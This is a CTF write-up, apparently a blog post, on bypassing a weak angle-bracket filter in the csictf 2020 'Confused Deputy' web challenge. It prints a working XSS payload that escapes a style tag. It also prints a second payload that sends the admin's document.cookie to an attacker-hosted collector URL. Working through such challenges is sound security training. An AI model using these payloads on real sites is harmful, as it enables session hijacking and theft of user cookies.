---
title: The Confused Deputy
date: 2020-12-29
excerpt: "'The Confused Deputy' was a challenge in the Stego category of csictf 2020"
classes: wide
categories: csictf2020
tags:
  - csictf2020
  - XSS
  - filter-evasion
  - cookie-stealing
---

![img](/assets/images/ctf/csictf2020-web-theconfuseddeputy/0.png)


/admin



![img](/assets/images/ctf/csictf2020-web-theconfuseddeputy/1.png)


Let's check out the source of the color visualizer.



![img](/assets/images/ctf/csictf2020-web-theconfuseddeputy/2.png)


In the source we can see how it's setting the background color, and that it's sanitizing the input to protect against XSS. Or is it?  

I noticed in my tests that only the initial <> are being filtered out. Anything after that is fine.  

So by escaping the style set variable, we can inject our XSS payload.  

`<></style><img src=x onerror=alert(document.cookie)>`



![img](/assets/images/ctf/csictf2020-web-theconfuseddeputy/3.png)


So we have XSS, but we want to send the cookie back to us rather than alert it.  

Here is the script that I hosted on my VPS:  

![img](/assets/images/ctf/csictf2020-web-theconfuseddeputy/4.png)
And here is the new payload:



`<></style><img src=x onerror=document.location='http://REDACTED/cookie.php?c='+document.cookie>;`



So now we can pass this information through the Admin page



URL to visit: [http://chall.csivit.com:30256/view](http://chall.csivit.com:30256/view)  

Color to see: payload



![img](/assets/images/ctf/csictf2020-web-theconfuseddeputy/5.png)
